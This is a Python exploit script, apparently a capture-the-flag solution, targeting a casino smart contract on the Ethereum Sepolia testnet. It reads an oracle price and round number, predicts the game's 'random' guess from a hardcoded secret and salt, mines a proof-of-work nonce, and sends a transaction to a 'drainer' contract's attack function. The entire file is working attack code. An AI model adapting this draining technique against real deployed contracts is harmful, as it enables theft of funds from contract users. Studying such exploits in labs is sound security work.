import os
from web3 import Web3
from eth_abi.packed import encode_packed
from eth_hash.auto import keccak
from dotenv import load_dotenv
import argparse

load_dotenv()

RPC_URL = "https://ethereum-sepolia-rpc.publicnode.com"
PRIVATE_KEY = os.getenv("PRIVATE_KEY")

if not PRIVATE_KEY:
    raise ValueError("La variable d'environnement PRIVATE_KEY n'est pas definie dans le fichier .env")

TARGET_ADDRESS = Web3.to_checksum_address("0xed5415679D46415f6f9a82677F8F4E9ed9D1302b")
ORACLE_ADDRESS = Web3.to_checksum_address("0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43")

SECRET_TARGET = 463646446423265643233525262662355635362666463
GAME_SALT = 7192271

try:
    w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={"timeout": 20}))
    assert w3.is_connected()
except Exception:
    exit(1)

account = w3.eth.account.from_key(PRIVATE_KEY)
PUBLIC_KEY = account.address
print(f"[*] EOA : {PUBLIC_KEY}")

ORACLE_ABI = [{
    "inputs": [],
    "name": "latestRoundData",
    "outputs": [
        {"name": "roundId", "type": "uint80"},
        {"name": "answer", "type": "int256"},
        {"name": "startedAt", "type": "uint256"},
        {"name": "updatedAt", "type": "uint256"},
        {"name": "answeredInRound", "type": "uint80"}
    ],
    "stateMutability": "view",
    "type": "function"
}]

CASINO_ABI = [{
    "inputs": [],
    "name": "currentRound",
    "outputs": [{"name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
}]

DRAINER_ABI = [{
    "inputs": [
        {"internalType": "uint256", "name": "_guess", "type": "uint256"},
        {"internalType": "uint256", "name": "_round", "type": "uint256"},
        {"internalType": "uint256", "name": "_nonce", "type": "uint256"}
    ],
    "name": "attack",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
}]

def get_onchain_data():
    oracle = w3.eth.contract(address=ORACLE_ADDRESS, abi=ORACLE_ABI)
    casino = w3.eth.contract(address=TARGET_ADDRESS, abi=CASINO_ABI)
    
    _, price, _, _, _ = oracle.functions.latestRoundData().call()
    current_round = casino.functions.currentRound().call()
    
    print(f"[*] Price: {price}")
    print(f"[*] Round: {current_round}")
    return price, current_round

def compute_guess(price, round_id):
    xor_val = SECRET_TARGET ^ price
    packed = encode_packed(['uint256', 'uint256', 'uint256'], [xor_val, GAME_SALT, round_id])
    guess = int.from_bytes(keccak(packed), "big")
    print(f"[*] Expected Guess: {hex(guess)}")
    return guess

def mine_nonce(sender, guess, round_id):
    print("[*] Minage...")
    sender_bytes = Web3.to_bytes(hexstr=sender)
    
    for nonce in range(0, 1000000):
        packed = encode_packed(['address', 'uint256', 'uint256', 'uint256'], 
                               [sender, round_id, guess, nonce])
        
        pow_hash = keccak(packed)
        if pow_hash[-2:] == b'\xbe\xef':
            print(f"[+] Nonce : {nonce} (hash: {pow_hash.hex()})")
            return nonce
            
    raise Exception("[-] Echec du minage")

def execute_attack(drainer_addr, guess, round_id, nonce):
    drainer = w3.eth.contract(address=Web3.to_checksum_address(drainer_addr), abi=DRAINER_ABI)
    
    tx = drainer.functions.attack(guess, round_id, nonce).build_transaction({
        'from': PUBLIC_KEY,
        'value': w3.to_wei(0.01, 'ether'),
        'nonce': w3.eth.get_transaction_count(PUBLIC_KEY),
        'gas': 3000000,
        'maxFeePerGas': w3.eth.gas_price * 2,
        'maxPriorityFeePerGas': w3.eth.gas_price,
    })
    
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"[+] Etherscan: https://sepolia.etherscan.io/tx/{tx_hash.hex()}")
    
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    if receipt.status == 1:
        print("[+] Succes")
    else:
        print("[-] Revert")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("drainer")
    args = parser.parse_args()

    drainer_address = args.drainer

    price, round_id = get_onchain_data()
    guess = compute_guess(price, round_id)
    nonce = mine_nonce(drainer_address, guess, round_id)
    
    execute_attack(drainer_address, guess, round_id, nonce)
